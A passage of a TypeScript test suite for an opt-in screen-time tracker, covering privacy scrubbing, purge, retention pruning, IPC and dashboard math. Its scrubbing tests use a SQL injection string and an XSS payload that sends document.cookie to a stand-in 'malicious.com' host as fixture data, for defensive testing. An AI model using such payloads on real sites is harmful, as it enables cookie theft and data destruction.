        expect(summary.top_apps.length).toBe(4);
        expect(summary.top_apps[0].app_name).toBe("code.exe");
        expect(summary.top_apps[0].duration_secs).toBe(4000);
        expect(summary.top_apps[1].app_name).toBe("discord.exe");
        expect(summary.top_apps[1].duration_secs).toBe(3000);
      });

      test("T1-F30-05: Returns empty state structure with zeros when no sessions exist", () => {
        const emptySummary = engine.getSummary("2020-01-01");
        expect(emptySummary.total_secs).toBe(0);
        expect(emptySummary.categories.belajar).toBe(0);
        expect(emptySummary.categories.netral).toBe(0);
        expect(emptySummary.categories.pengalih).toBe(0);
        expect(emptySummary.top_apps).toEqual([]);
      });
    });

    // Feature 31: VC-U5 Presentation & Visual Gate
    describe("Feature 31: VC-U5 Presentation & Visual Gate", () => {
      test("T1-F31-01: Belajar category maps strictly to mint (#34E3A6) or sky (#5AA9FF)", () => {
        expect(VC_U5_CATEGORY_TOKENS.belajar.primary).toBe("#34E3A6");
        expect(VC_U5_CATEGORY_TOKENS.belajar.secondary).toBe("#5AA9FF");
      });

      test("T1-F31-02: Netral category maps strictly to text-2 (#A7AEBB) or cyan (#38D6F5)", () => {
        expect(VC_U5_CATEGORY_TOKENS.netral.primary).toBe("#A7AEBB");
        expect(VC_U5_CATEGORY_TOKENS.netral.secondary).toBe("#38D6F5");
      });

      test("T1-F31-03: Pengalih category maps strictly to coral (#FF7A59) or red (#FF4D5E)", () => {
        expect(VC_U5_CATEGORY_TOKENS.pengalih.primary).toBe("#FF7A59");
        expect(VC_U5_CATEGORY_TOKENS.pengalih.secondary).toBe("#FF4D5E");
      });

      test("T1-F31-04: Panel & tab titles conform to <= 16 characters", () => {
        expect(validateCopyLimits(SCREENTIME_UI_STRINGS.panel_title, 16)).toBe(true);
        expect(validateCopyLimits(SCREENTIME_UI_STRINGS.tab_usage, 16)).toBe(true);
        expect(validateCopyLimits(SCREENTIME_UI_STRINGS.tab_settings, 16)).toBe(true);
      });

      test("T1-F31-05: Subtitles & descriptions conform to <= 36 characters", () => {
        expect(validateCopyLimits(SCREENTIME_UI_STRINGS.desc_retention, 36)).toBe(true);
        expect(validateCopyLimits(SCREENTIME_UI_STRINGS.desc_optin, 36)).toBe(true);
        expect(validateCopyLimits(SCREENTIME_UI_STRINGS.empty_state, 36)).toBe(true);
      });

      test("T1-F31-06: Button action labels conform to <= 10 characters", () => {
        expect(validateCopyLimits(SCREENTIME_UI_STRINGS.btn_purge, 10)).toBe(true);
        expect(validateCopyLimits(SCREENTIME_UI_STRINGS.btn_enable, 10)).toBe(true);
        expect(validateCopyLimits(SCREENTIME_UI_STRINGS.btn_disable, 10)).toBe(true);
        expect(validateCopyLimits(SCREENTIME_UI_STRINGS.btn_cancel, 10)).toBe(true);
      });

      test("T1-F31-07: All UI strings contain 0 emoji characters (Anti-Slop Compliance)", () => {
        for (const [key, text] of Object.entries(SCREENTIME_UI_STRINGS)) {
          const hasEmoji = /[\u{1F300}-\u{1F9FF}\u{2600}-\u{26FF}]/u.test(text);
          expect(hasEmoji).toBe(false);
        }
      });
    });
  });

  // ==========================================================================
  // TIER 2: BOUNDARY, CORNER & ADVERSARIAL STRESS CASES
  // ==========================================================================
  describe("Tier 2: Boundary, Corner & Adversarial Stress Cases", () => {

    // Feature 22 Boundaries
    describe("Feature 22 Boundaries & Concurrency", () => {
      test("T2-F22-01: Rapid oscillating opt-in toggles settle on final value consistently", () => {
        for (let i = 0; i < 20; i++) {
          engine.setOptIn(i % 2 === 0);
        }
        expect(engine.getOptIn()).toBe(false); // Last iteration i=19 (odd) -> false
      });

      test("T2-F22-02: Recording session during exact boundary transition handles state safely", () => {
        engine.setOptIn(true);
        const res1 = engine.recordSession({ app_name: "code.exe", duration_secs: 50, timestamp: 1763726400 });
        expect(res1.recorded).toBe(true);

        engine.setOptIn(false);
        const res2 = engine.recordSession({ app_name: "code.exe", duration_secs: 50, timestamp: 1763726401 });
        expect(res2.recorded).toBe(false);
      });

      test("T2-F22-03: Non-boolean opt_in IPC values throw or reject without corrupting DB", async () => {
        expect(ipc.invoke("productivity.screentime.set_opt_in", { opt_in: "yes" as any }))
          .rejects.toThrow("Invalid payload");
        expect(ipc.invoke("productivity.screentime.set_opt_in", { opt_in: 1 as any }))
          .rejects.toThrow("Invalid payload");
      });

      test("T2-F22-04: Disabling opt-in preserves existing records without accidental deletion", () => {
        engine.setOptIn(true);
        engine.recordSession({ app_name: "code.exe", duration_secs: 100, timestamp: 1763726400 });
        expect(engine.getSessionCount()).toBe(1);

        engine.setOptIn(false);
        expect(engine.getSessionCount()).toBe(1); // Not cleared!
      });

      test("T2-F22-05: Missing settings table handled by automatic schema initialization", () => {
        const freshDb = new Database(":memory:");
        const eng = new ScreenTimeStorageEngine(freshDb);
        expect(eng.getOptIn()).toBe(false);
        freshDb.close();
      });
    });

    // Feature 23 Adversarial Privacy Scrubbing
    describe("Feature 23 Adversarial Privacy Scrubbing", () => {
      test("T2-F23-01: Window title with SQL injection payload is completely stripped", () => {
        const raw: RawWindowUsageEvent = {
          app_name: "code.exe",
          window_title: "'; DROP TABLE screen_time_sessions; SELECT * FROM '",
          duration_secs: 60,
          timestamp: 1763726400
        };
        const scrubbed = PrivacyScrubbingEngine.scrub(raw);
        expect(scrubbed.window_title).toBeNull();
      });

      test("T2-F23-02: Window title with Cross-Site Scripting (XSS) payload is strictly null", () => {
        const raw: RawWindowUsageEvent = {
          app_name: "chrome.exe",
          window_title: "<script>fetch('http://malicious.com/?c='+document.cookie)</script>",
          duration_secs: 120,
          timestamp: 1763726400
        };
        const scrubbed = PrivacyScrubbingEngine.scrub(raw);
        expect(scrubbed.window_title).toBeNull();
      });

      test("T2-F23-03: Deep URL containing basic auth credentials & session tokens is discarded", () => {
        const raw: RawWindowUsageEvent = {
          app_name: "firefox.exe",
          url: "https://admin:super_secret_password@vault.internal/key?jwt=eyJhbGciOiJIUzI1NiJ9",
          duration_secs: 15,
          timestamp: 1763726400
        };
        const scrubbed = PrivacyScrubbingEngine.scrub(raw);
        expect((scrubbed as any).url).toBeUndefined();
      });

      test("T2-F23-04: Giant 10MB base64 screenshot blob is dropped with 0 bytes retained", () => {
        const giantBlob = "A".repeat(10 * 1024 * 1024); // 10MB
        const raw: RawWindowUsageEvent = {
          app_name: "code.exe",
          screenshot_blob: giantBlob,
          duration_secs: 10,
          timestamp: 1763726400
        };
        const scrubbed = PrivacyScrubbingEngine.scrub(raw);
        expect((scrubbed as any).screenshot_blob).toBeUndefined();
      });

      test("T2-F23-05: Deep nested path with 500+ characters normalized to clean executable name", () => {
        const deepPath = "C:\\Program Files\\Deeply\\Nested\\Directory\\Structure\\With\\Many\\Levels\\AppName.exe";
        const normalized = PrivacyScrubbingEngine.normalizeAppName(deepPath);
        expect(normalized).toBe("appname.exe");
      });

      test("T2-F23-06: Zero-width characters & control codes stripped from application names", () => {
        const dirtyName = "Code\u200B\u200C.exe\x00\x07";
        const normalized = PrivacyScrubbingEngine.normalizeAppName(dirtyName);
        expect(normalized).toBe("code.exe");
      });

      test("T2-F23-07: Negative, zero, and extreme (>86400s) durations safely clamped", () => {
        const negativeEvent = PrivacyScrubbingEngine.scrub({
          app_name: "code.exe",
          duration_secs: -999,
          timestamp: 1763726400
        });
        expect(negativeEvent.duration_secs).toBe(0);

        const hugeEvent = PrivacyScrubbingEngine.scrub({
          app_name: "code.exe",
          duration_secs: 999999999,
          timestamp: 1763726400
        });
        expect(hugeEvent.duration_secs).toBe(86400); // Max 24 hours per slice
      });
    });

    // Feature 24 Purge Boundaries & Concurrency
    describe("Feature 24 Purge Boundaries & Concurrency", () => {
      test("T2-F24-01: Purge on empty database returns zero without SQLite error", () => {
        const res = engine.clearAll();
        expect(res.deleted_sessions).toBe(0);
        expect(res.deleted_enforcements).toBe(0);
        expect(res.vacuumed).toBe(true);
      });

      test("T2-F24-02: Purge on dataset with 1,000 records executes atomically and vacuums", () => {
        engine.setOptIn(true);
        const insertStmt = db.prepare(`
          INSERT INTO screen_time_sessions (id, app_name, window_title, category, duration_secs, timestamp, date_str)
          VALUES (?, ?, NULL, ?, ?, ?, ?)
        `);

        const tx = db.transaction(() => {
          for (let i = 0; i < 1000; i++) {
            insertStmt.run(`st-${i}`, "code.exe", "belajar", 10, 1763726400 + i, "2025-11-21");
          }
        });
        tx();

        expect(engine.getSessionCount()).toBe(1000);
        const purgeRes = engine.clearAll();
        expect(purgeRes.deleted_sessions).toBe(1000);
        expect(engine.getSessionCount()).toBe(0);
      });

      test("T2-F24-03: Purge preserves accountability_settings row and opt_in value", () => {
        engine.setOptIn(true);
        engine.recordSession({ app_name: "code.exe", duration_secs: 60, timestamp: 1763726400 });

        engine.clearAll();
        expect(engine.getOptIn()).toBe(true); // User opt-in choice remains active
      });

      test("T2-F24-04: Purge preserves unrelated tables (e.g. routines table)", () => {
        db.run(`CREATE TABLE IF NOT EXISTS routines (id TEXT PRIMARY KEY, title TEXT);`);
        db.run(`INSERT INTO routines VALUES ('routine-1', 'Deep Work');`);

        engine.clearAll();
        const routineRow = db.query(`SELECT id FROM routines WHERE id = 'routine-1'`).get() as any;
        expect(routineRow.id).toBe("routine-1");
      });

      test("T2-F24-05: Double purge followed by record and purge again executes cleanly", () => {
        engine.setOptIn(true);
        engine.clearAll();
        engine.clearAll();

        engine.recordSession({ app_name: "code.exe", duration_secs: 100, timestamp: 1763726400 });
        expect(engine.getSessionCount()).toBe(1);

        const thirdPurge = engine.clearAll();
        expect(thirdPurge.deleted_sessions).toBe(1);
        expect(engine.getSessionCount()).toBe(0);
      });
    });

    // Feature 25 Retention Pruner Boundaries
    describe("Feature 25 Retention Pruner Boundaries", () => {
      const NOW = 1763726400; // Reference timestamp
      const CUTOFF = NOW - 90 * 86400;

      beforeEach(() => {
        engine.setOptIn(true);
      });

      test("T2-F25-01: Boundary test: record at CUTOFF - 1 second is pruned", () => {
        engine.recordSession({ app_name: "code.exe", duration_secs: 10, timestamp: CUTOFF - 1 });
        const pruned = engine.pruneRetention(NOW, 90);
        expect(pruned).toBe(1);
        expect(engine.getSessionCount()).toBe(0);
      });

      test("T2-F25-02: Boundary test: record at exact CUTOFF is preserved", () => {
        engine.recordSession({ app_name: "code.exe", duration_secs: 10, timestamp: CUTOFF });
        const pruned = engine.pruneRetention(NOW, 90);
        expect(pruned).toBe(0);
        expect(engine.getSessionCount()).toBe(1);
      });

      test("T2-F25-03: Boundary test: record at CUTOFF + 1 second is preserved", () => {
        engine.recordSession({ app_name: "code.exe", duration_secs: 10, timestamp: CUTOFF + 1 });
        const pruned = engine.pruneRetention(NOW, 90);
        expect(pruned).toBe(0);
        expect(engine.getSessionCount()).toBe(1);
      });

      test("T2-F25-04: Future timestamps (clock skew) are preserved safely", () => {
        engine.recordSession({ app_name: "code.exe", duration_secs: 10, timestamp: NOW + 86400 });
        const pruned = engine.pruneRetention(NOW, 90);
        expect(pruned).toBe(0);
        expect(engine.getSessionCount()).toBe(1);
      });

      test("T2-F25-05: Custom retention days parameter (e.g. 30 days) respected", () => {
        // Record 40 days old
        engine.recordSession({ app_name: "code.exe", duration_secs: 10, timestamp: NOW - 40 * 86400 });
        // Prune with 30-day retention
        const pruned = engine.pruneRetention(NOW, 30);
        expect(pruned).toBe(1);
        expect(engine.getSessionCount()).toBe(0);
      });

      test("T2-F25-06: Batch pruning 1,000 old records executes without memory spike", () => {
        const insertStmt = db.prepare(`
          INSERT INTO screen_time_sessions (id, app_name, window_title, category, duration_secs, timestamp, date_str)
          VALUES (?, ?, NULL, ?, ?, ?, ?)
        `);

        const tx = db.transaction(() => {
          for (let i = 0; i < 1000; i++) {
            insertStmt.run(`st-old-${i}`, "code.exe", "belajar", 10, CUTOFF - 1000 - i, "2025-01-01");
          }
        });
        tx();

        expect(engine.getSessionCount()).toBe(1000);
        const pruned = engine.pruneRetention(NOW, 90);
        expect(pruned).toBe(1000);
        expect(engine.getSessionCount()).toBe(0);
      });
    });

    // Feature 26 IPC Bridge Edge Cases
    describe("Feature 26 IPC Bridge Edge Cases", () => {
      test("T2-F26-01: Unsupported IPC command returns method not found error", async () => {
        expect(ipc.invoke("productivity.screentime.invalid_command"))
          .rejects.toThrow("Method not found");
      });

      test("T2-F26-02: Empty payload to record throws validation error", async () => {
        await ipc.invoke("productivity.screentime.set_opt_in", { opt_in: true });
        expect(ipc.invoke("productivity.screentime.record", {}))
          .rejects.toThrow("app_name is required");
      });

      test("T2-F26-03: Invalid date format in get_summary defaults to today without crashing", async () => {
        const summary = await ipc.invoke("productivity.screentime.get_summary", { date: "invalid-date-format" });
        expect(summary.total_secs).toBe(0);
        expect(summary.top_apps).toEqual([]);
      });

      test("T2-F26-04: get_7day_trend handles leap year and month-end dates gracefully", async () => {
        const trend = await ipc.invoke("productivity.screentime.get_7day_trend", { end_date: "2024-03-02" });
        expect(trend.length).toBe(7);
        // 2024 is a leap year; 2024-02-29 should be within the range
        const dates = trend.map((t: any) => t.date);
        expect(dates).toContain("2024-02-29");
      });

      test("T2-F26-05: Serialization roundtrip preserves large timestamps and durations", async () => {
        await ipc.invoke("productivity.screentime.set_opt_in", { opt_in: true });
        await ipc.invoke("productivity.screentime.record", {
          app_name: "Code.exe",
          duration_secs: 86400,
          timestamp: 2147483647 // Max 32-bit signed int
        });

        const list = engine.listSessions(1);
        expect(list[0].timestamp).toBe(2147483647);
        expect(list[0].duration_secs).toBe(86400);
      });
    });

    // Feature 30 Dashboard Edge Cases & Math
    describe("Feature 30 Dashboard Edge Cases & Off-By-One", () => {
      beforeEach(() => {
        engine.setOptIn(true);
      });

      test("T2-F30-01: Single category dominance (100% Belajar) handles 0 netral & pengalih", () => {
        engine.recordSession({ app_name: "code.exe", duration_secs: 1800, timestamp: 1763726400 });
        const summary = engine.getSummary("2025-11-21");

        expect(summary.category_percentages.belajar).toBe(100);
        expect(summary.category_percentages.netral).toBe(0);
        expect(summary.category_percentages.pengalih).toBe(0);
      });

      test("T2-F30-02: Offline user with 4 missing days in 7-day trend correctly padded with zeros", () => {
        // Only active on Day -6 (2025-11-15) and Day 0 (2025-11-21)
        engine.recordSession({ app_name: "code.exe", duration_secs: 500, timestamp: 1763726400 }); // 2025-11-21
        engine.recordSession({ app_name: "code.exe", duration_secs: 300, timestamp: 1763726400 - 6 * 86400 }); // 2025-11-15

        const trend = engine.get7DayTrend("2025-11-21");
        expect(trend.length).toBe(7);
        expect(trend[6].total_secs).toBe(500); // 2025-11-21
        expect(trend[0].total_secs).toBe(300); // 2025-11-15

        // Middle days 1..5 must be 0
        for (let i = 1; i <= 5; i++) {
          expect(trend[i].total_secs).toBe(0);
        }
      });

      test("T2-F30-03: 1-second session duration accurately recorded, aggregated, and ranked", () => {
        engine.recordSession({ app_name: "calculator.exe", duration_secs: 1, timestamp: 1763726400 });
        const summary = engine.getSummary("2025-11-21");

        expect(summary.total_secs).toBe(1);
        expect(summary.top_apps[0].duration_secs).toBe(1);
      });

      test("T2-F30-04: Multiple sessions for same application correctly coalesced in top_apps", () => {
        engine.recordSession({ app_name: "code.exe", duration_secs: 100, timestamp: 1763726400 });
        engine.recordSession({ app_name: "code.exe", duration_secs: 200, timestamp: 1763726400 });
        engine.recordSession({ app_name: "code.exe", duration_secs: 300, timestamp: 1763726400 });

        const summary = engine.getSummary("2025-11-21");
        expect(summary.top_apps.length).toBe(1);
        expect(summary.top_apps[0].duration_secs).toBe(600);
      });

      test("T2-F30-05: Percentage rounding edge case where total is 3 seconds (1s, 1s, 1s)", () => {
        engine.recordSession({ app_name: "code.exe", duration_secs: 1, timestamp: 1763726400 }); // belajar
        engine.recordSession({ app_name: "explorer.exe", duration_secs: 1, timestamp: 1763726400 }); // netral
        engine.recordSession({ app_name: "discord.exe", duration_secs: 1, timestamp: 1763726400 }); // pengalih

        const summary = engine.getSummary("2025-11-21");
        expect(summary.category_percentages.belajar).toBe(33);
        expect(summary.category_percentages.netral).toBe(33);
        expect(summary.category_percentages.pengalih).toBe(33);
      });
    });

    // Feature 31 Visual Gate & Copy Limit Boundaries
    describe("Feature 31 Visual Gate & Copy Limit Boundaries", () => {
      test("T2-F31-01: Rejection of prohibited AI slop colors outside tokens.json", () => {
        const approvedHex = new Set([
          "#34E3A6", "#5AA9FF", "#A7AEBB", "#38D6F5", "#FF7A59", "#FF4D5E",
          "#0D0E12", "#14161C", "#1B1E26", "#F4F6FA", "#6F7785", "#000000", "#262A34"
        ].map(h => h.toUpperCase()));

        // Check our category tokens
        for (const cat of Object.values(VC_U5_CATEGORY_TOKENS)) {
          expect(approvedHex.has(cat.primary.toUpperCase())).toBe(true);
          expect(approvedHex.has(cat.secondary.toUpperCase())).toBe(true);
        }

        // Test rejection of arbitrary colors
        const arbitraryColors = ["#8A2BE2", "#7928CA", "#FF00FF", "#00FF00"];
        for (const badColor of arbitraryColors) {
          expect(approvedHex.has(badColor.toUpperCase())).toBe(false);
        }
      });

      test("T2-F31-02: String at boundary 16 chars passes; 17 chars fails (Title Limit)", () => {
        const exact16 = "A".repeat(16);
        const over17 = "A".repeat(17);
        expect(validateCopyLimits(exact16, 16)).toBe(true);
        expect(validateCopyLimits(over17, 16)).toBe(false);
      });

      test("T2-F31-03: String at boundary 36 chars passes; 37 chars fails (Description Limit)", () => {
        const exact36 = "B".repeat(36);
        const over37 = "B".repeat(37);
        expect(validateCopyLimits(exact36, 36)).toBe(true);
        expect(validateCopyLimits(over37, 36)).toBe(false);
      });

      test("T2-F31-04: String at boundary 10 chars passes; 11 chars fails (Button Limit)", () => {
        const exact10 = "C".repeat(10);
        const over11 = "C".repeat(11);
        expect(validateCopyLimits(exact10, 10)).toBe(true);
        expect(validateCopyLimits(over11, 10)).toBe(false);
      });

      test("T2-F31-05: String at boundary 40 chars passes; 41 chars fails (Bubble Limit)", () => {
        const exact40 = "D".repeat(40);
        const over41 = "D".repeat(41);
        expect(validateCopyLimits(exact40, 40)).toBe(true);
        expect(validateCopyLimits(over41, 40)).toBe(false);
      });

      test("T2-F31-06: String at boundary 44 chars passes; 45 chars fails (Error Limit)", () => {
        const exact44 = "E".repeat(44);
        const over45 = "E".repeat(45);
        expect(validateCopyLimits(exact44, 44)).toBe(true);
        expect(validateCopyLimits(over45, 44)).toBe(false);
      });

      test("T2-F31-07: Rejection of complex emoji variations (skin tones, symbols, flags)", () => {
        expect(validateCopyLimits("Belajar 👍", 20)).toBe(false);
        expect(validateCopyLimits("Fokus ⚡", 20)).toBe(false);
        expect(validateCopyLimits("Warning ⚠️", 20)).toBe(false);
      });
    });
  });

  // ==========================================================================
  // TIER 3: CROSS-FEATURE PAIRWISE COMBINATIONS
  // ==========================================================================
  describe("Tier 3: Cross-Feature Pairwise Combinations", () => {

    test("T3-PAIR-01 (F22 + F23): Opt-in Gate + Privacy Scrubber: Dirty payload when opt-in=false is dropped; when opt-in=true is cleaned", () => {
      const dirtyEvent: RawWindowUsageEvent = {
        app_name: "C:\\Program Files\\VSCode\\Code.exe",
        window_title: "Top Secret Strategy",
        url: "https://secret.com",
        keystrokes: "my_pass",
        duration_secs: 150,
        timestamp: 1763726400
      };

      // 1. Opt-out: completely dropped
      engine.setOptIn(false);
      const res1 = engine.recordSession(dirtyEvent);
      expect(res1.recorded).toBe(false);
      expect(engine.getSessionCount()).toBe(0);

      // 2. Opt-in: scrubbed and recorded
      engine.setOptIn(true);
      const res2 = engine.recordSession(dirtyEvent);
      expect(res2.recorded).toBe(true);
      expect(engine.getSessionCount()).toBe(1);

      const saved = engine.listSessions(1)[0];
      expect(saved.app_name).toBe("code.exe");
      expect(saved.window_title).toBeNull();
    });

    test("T3-PAIR-02 (F22 + F24): Opt-in Gate + One-Click Purge: Purge preserves active opt-in status", () => {
      engine.setOptIn(true);
      engine.recordSession({ app_name: "code.exe", duration_secs: 100, timestamp: 1763726400 });

      const purgeRes = engine.clearAll();
      expect(purgeRes.deleted_sessions).toBe(1);
      expect(engine.getOptIn()).toBe(true); // Still opted in
    });

    test("T3-PAIR-03 (F22 + F25): Opt-in Gate + 90-Day Pruner: Pruner runs and cleans legacy data even if opt-in is currently disabled", () => {
      engine.setOptIn(true);
      engine.recordSession({ app_name: "code.exe", duration_secs: 100, timestamp: 1763726400 - 95 * 86400 });
      expect(engine.getSessionCount()).toBe(1);

      // User later turns off opt-in
      engine.setOptIn(false);

      // Pruner still clears records older than 90 days
      const pruned = engine.pruneRetention(1763726400, 90);
      expect(pruned).toBe(1);
      expect(engine.getSessionCount()).toBe(0);
    });

    test("T3-PAIR-04 (F22 + F26): Opt-in Gate + IPC Bridge: Toggling opt-in via IPC reflects immediately in recording", async () => {
      await ipc.invoke("productivity.screentime.set_opt_in", { opt_in: false });
      const record1 = await ipc.invoke("productivity.screentime.record", {
        app_name: "Code.exe",
        duration_secs: 100
      });
      expect(record1.recorded).toBe(false);

      await ipc.invoke("productivity.screentime.set_opt_in", { opt_in: true });
      const record2 = await ipc.invoke("productivity.screentime.record", {
        app_name: "Code.exe",
        duration_secs: 100
      });
      expect(record2.recorded).toBe(true);
    });

    test("T3-PAIR-05 (F23 + F25): Privacy Scrubber + 90-Day Pruner: Sanitized date strings and timestamps accurately filtered by pruner", () => {
      engine.setOptIn(true);
      const NOW = 1763726400;

      // 100 days ago
      engine.recordSession({
        app_name: "C:\\Windows\\System32\\cmd.exe",
        window_title: "Secret Terminal",
        duration_secs: 50,
        timestamp: NOW - 100 * 86400
      });

      // 10 days ago
      engine.recordSession({
        app_name: "cmd.exe",
        duration_secs: 50,
        timestamp: NOW - 10 * 86400
      });

      const pruned = engine.pruneRetention(NOW, 90);
      expect(pruned).toBe(1);

      const remaining = engine.listSessions(10);
      expect(remaining.length).toBe(1);
      expect(remaining[0].app_name).toBe("cmd.exe");
    });

    test("T3-PAIR-06 (F23 + F26): Privacy Scrubber + IPC Bridge: IPC query responses never leak scrubbed fields", async () => {
      await ipc.invoke("productivity.screentime.set_opt_in", { opt_in: true });
      await ipc.invoke("productivity.screentime.record", {
        app_name: "chrome.exe",
        window_title: "My Secret Bank Dashboard",
        url: "https://bank.com",
        duration_secs: 200,
        timestamp: 1763726400
      });

      const summary = await ipc.invoke("productivity.screentime.get_summary", { date: "2025-11-21" });
      const app = summary.top_apps[0];
      expect(app.app_name).toBe("chrome.exe");
      expect((app as any).window_title).toBeUndefined();
      expect((app as any).url).toBeUndefined();
    });

    test("T3-PAIR-07 (F24 + F25): One-Click Purge + 90-Day Pruner: Pruner after purge runs without error or side-effect", () => {
      engine.setOptIn(true);
      engine.recordSession({ app_name: "code.exe", duration_secs: 100, timestamp: 1763726400 });

      engine.clearAll();
      const pruned = engine.pruneRetention(1763726400, 90);
      expect(pruned).toBe(0);
      expect(engine.getSessionCount()).toBe(0);
    });

    test("T3-PAIR-08 (F24 + F26): One-Click Purge + IPC Bridge: IPC clear_all triggers SQLite vacuum and clears summary", async () => {
      await ipc.invoke("productivity.screentime.set_opt_in", { opt_in: true });
      await ipc.invoke("productivity.screentime.record", { app_name: "code.exe", duration_secs: 500, timestamp: 1763726400 });

      const clearRes = await ipc.invoke("productivity.screentime.clear_all");
      expect(clearRes.deleted_rows).toBe(1);
      expect(clearRes.vacuumed).toBe(true);

      const summary = await ipc.invoke("productivity.screentime.get_summary", { date: "2025-11-21" });
      expect(summary.total_secs).toBe(0);
    });

    test("T3-PAIR-09 (F25 + F30): 90-Day Pruner + Dashboard 7-Day Trend: Pruning records >90d does not alter recent 7-day trend", () => {
      engine.setOptIn(true);
      const NOW = 1763726400; // 2025-11-21

      // Old record (95d ago)
      engine.recordSession({ app_name: "code.exe", duration_secs: 2000, timestamp: NOW - 95 * 86400 });
      // Recent record (today)
      engine.recordSession({ app_name: "code.exe", duration_secs: 1500, timestamp: NOW });

      const trendBefore = engine.get7DayTrend("2025-11-21");
      engine.pruneRetention(NOW, 90);
      const trendAfter = engine.get7DayTrend("2025-11-21");

      expect(trendBefore).toEqual(trendAfter);
      expect(trendAfter[6].total_secs).toBe(1500);
    });

    test("T3-PAIR-10 (F26 + F30): IPC Bridge + Dashboard Aggregations: get_summary and get_7day_trend report identical daily total", async () => {
      await ipc.invoke("productivity.screentime.set_opt_in", { opt_in: true });
      await ipc.invoke("productivity.screentime.record", { app_name: "code.exe", duration_secs: 1200, timestamp: 1763726400 });
      await ipc.invoke("productivity.screentime.record", { app_name: "steam.exe", duration_secs: 600, timestamp: 1763726400 });

      const summary = await ipc.invoke("productivity.screentime.get_summary", { date: "2025-11-21" });
      const trend = await ipc.invoke("productivity.screentime.get_7day_trend", { end_date: "2025-11-21" });

      expect(summary.total_secs).toBe(1800);
      expect(trend[6].total_secs).toBe(1800);
    });

    test("T3-PAIR-11 (F30 + F31): Dashboard Categories + VC-U5 Tokens: Category cards use approved accent colors", () => {
      const summary = engine.getSummary("2025-11-21");
      const mappedColors = {
        belajar: VC_U5_CATEGORY_TOKENS.belajar.primary,
        netral: VC_U5_CATEGORY_TOKENS.netral.primary,
        pengalih: VC_U5_CATEGORY_TOKENS.pengalih.primary
      };

      expect(mappedColors.belajar).toBe(tokens.accents.mint.value);
      expect(mappedColors.netral).toBe(tokens.text["text-2"].value);
      expect(mappedColors.pengalih).toBe(tokens.accents.coral.value);
    });

    test("T3-PAIR-12 (F30 + F31): Dashboard Text Registry + Copy Limits: All UI strings conform strictly to copy limits", () => {
      expect(validateCopyLimits(SCREENTIME_UI_STRINGS.panel_title, 16)).toBe(true);
      expect(validateCopyLimits(SCREENTIME_UI_STRINGS.tab_usage, 16)).toBe(true);
      expect(validateCopyLimits(SCREENTIME_UI_STRINGS.desc_retention, 36)).toBe(true);
      expect(validateCopyLimits(SCREENTIME_UI_STRINGS.btn_purge, 10)).toBe(true);
      expect(validateCopyLimits(SCREENTIME_UI_STRINGS.confirm_purge, 40)).toBe(true);
      expect(validateCopyLimits(SCREENTIME_UI_STRINGS.err_load_failed, 44)).toBe(true);
    });
  });

  // ==========================================================================
  // TIER 4: REAL-WORLD APPLICATION SCENARIO S7 (SCENARIO-07-PRIVACY-PURGE)
  // ==========================================================================
  describe("Tier 4: Scenario S7 (SCENARIO-07-PRIVACY-PURGE)", () => {

    test("S7-01: Full Lifecycle: Default disabled -> Dirty attempts dropped -> Opt-in -> Scrubbed study session -> 90d pruning -> Dashboard query -> One-Click Purge & Vacuum", async () => {
      const NOW = 1763726400; // 2025-11-21

      // ------------------------------------------------------------------------
      // Step 1: Initial state verification (Fresh install)
      // ------------------------------------------------------------------------
      const initialSettings = await ipc.invoke("productivity.screentime.get_settings");
      expect(initialSettings.opt_in).toBe(false);
      expect(engine.getSessionCount()).toBe(0);

      // ------------------------------------------------------------------------
      // Step 2: Attempt recording while opt-in is false (Zero-telemetry gate)
      // ------------------------------------------------------------------------
      const unOptedEvent: RawWindowUsageEvent = {
        app_name: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
        window_title: "Confidential_M&A_Q3_Financials.docx - Microsoft Word",
        url: "https://internal.firm.com/mergers",
        keystrokes: "classified acquisition details",
        duration_secs: 900,
        timestamp: NOW
      };
      const unOptedResult = await ipc.invoke("productivity.screentime.record", unOptedEvent);
      expect(unOptedResult.recorded).toBe(false);
      expect(unOptedResult.reason).toBe("opt_out");
      expect(engine.getSessionCount()).toBe(0); // Zero writes verified

      // ------------------------------------------------------------------------
      // Step 3: User opts in via Island Shell Settings
      // ------------------------------------------------------------------------
      const optInResult = await ipc.invoke("productivity.screentime.set_opt_in", { opt_in: true });
      expect(optInResult.success).toBe(true);
      expect(optInResult.opt_in).toBe(true);

      // ------------------------------------------------------------------------
      // Step 4: Productive study session occurs with dirty raw window events
      // ------------------------------------------------------------------------
      // Event A: Coding in VS Code (Belajar) with sensitive project window title
      await ipc.invoke("productivity.screentime.record", {
        app_name: "C:\\Users\\Satoshi\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe",
        window_title: "hime-core/src/auth.rs - PrivateRepo (Workspace) - Visual Studio Code",
        url: null,
        keystrokes: "fn authenticate_user() { ... }",
        keystroke_count: 35,
        screenshot_blob: "data:image/png;base64,SECRET_DESKTOP_PIXELS",
        duration_secs: 2700, // 45 minutes
        timestamp: NOW - 3600
      });

      // Event B: Terminal session (Belajar)
      await ipc.invoke("productivity.screentime.record", {
        app_name: "WindowsTerminal.exe",
        window_title: "Administrator: Windows PowerShell (cargo test)",
        duration_secs: 900, // 15 minutes
        timestamp: NOW - 2700
      });

      // Event C: File Explorer (Netral)
      await ipc.invoke("productivity.screentime.record", {
        app_name: "explorer.exe",
        window_title: "C:\\Users\\Satoshi\\Documents\\Finance",
        duration_secs: 600, // 10 minutes
        timestamp: NOW - 1800
      });

      // Event D: Gaming distraction (Pengalih)
      await ipc.invoke("productivity.screentime.record", {
        app_name: "steam.exe",
        window_title: "Steam - Game Store & Community",
        duration_secs: 1200, // 20 minutes
        timestamp: NOW - 1200
      });

      // Assert 4 scrubbed sessions recorded
      expect(engine.getSessionCount()).toBe(4);

      // ------------------------------------------------------------------------
      // Step 5: Verify Privacy Scrubbing Invariants on database rows
      // ------------------------------------------------------------------------
      const recordedSessions = engine.listSessions(10);
      for (const s of recordedSessions) {
        // Invariant 1: Window title is strictly NULL
        expect(s.window_title).toBeNull();
        // Invariant 2: App name is normalized without file path
        expect(s.app_name.includes("\\")).toBe(false);
        expect(s.app_name.includes("/")).toBe(false);
        // Invariant 3: Category is valid
        expect(["belajar", "netral", "pengalih"]).toContain(s.category);
        // Invariant 4: No telemetry leaked
        expect((s as any).url).toBeUndefined();
        expect((s as any).keystrokes).toBeUndefined();
        expect((s as any).screenshot_blob).toBeUndefined();
      }

      // ------------------------------------------------------------------------
      // Step 6: Inject historical records for retention pruning test
      // ------------------------------------------------------------------------
      // 5 records from 95 days ago (>90d cutoff)
      for (let i = 0; i < 5; i++) {
        engine.recordSession({
